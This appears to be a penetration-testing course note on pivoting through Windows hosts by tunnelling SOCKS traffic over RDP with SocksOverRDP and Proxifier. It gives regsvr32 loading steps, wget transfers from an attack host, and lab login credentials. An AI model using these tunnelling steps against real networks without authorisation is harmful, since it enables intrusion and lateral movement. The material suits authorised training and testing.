- There are often times during an assessment when we may be limited to a **Windows network and may not be able to use SSH for pivoting.**
- We would have to use tools available for Windows operating systems in these cases.
- Some examples of usage of this feature would be clipboard data transfer and audio sharing.
- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection.
	- We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.

- We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

	1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
	2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

- We can then connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.

# Loading SocksOverRDP.dll using regsvr32.exe
---
- `regsvr32.exe SocksOverRDP-Plugin.dll` **As Powershell Administrator**

- Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`
- And we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.

- We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

- After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.

# Lab
---
## Uploading Files
- `python3 -m http.server` to serve files
- `wget 10.10.16.34/SocksOverRDP-Plugin.dll -o SocksOverRDP-Plugin.dll`
- `wget 10.10.16.34/SocksOverRDP-Server.exe -o SocksOverRDP-Server.exe`
- `wget 10.10.16.34/ProxifierPE.zip -o ProxifierPE.zip`

## Login to 172.16.5.19 over RDP using `mstsc.exe`
- `regsvr32.exe SocksOverRDP-Plugin.dll` => Load DLL
- Start powershell as admin
- `mstsc.exe`
- `172.16.5.19` : `victor` : `pass@123`
## Transfer SocksOverRDP-Server.exe using RDP
- Start `SocksOverRDP-Server.exe` as Administrator on internal pivot machine (.19)
## Configure proxifier on 10.x.x.x machine
- Use `127.0.0.1` as proxy host name
- Select `socks5` as proxy protocol
## Connect with internal machine `172.16.5.155`:
- Use `mstsc.exe`: `jason` : `WellConnected123!`
- ![[Pasted image 20250804054810.png]]
- ![[Pasted image 20250804060609.png]]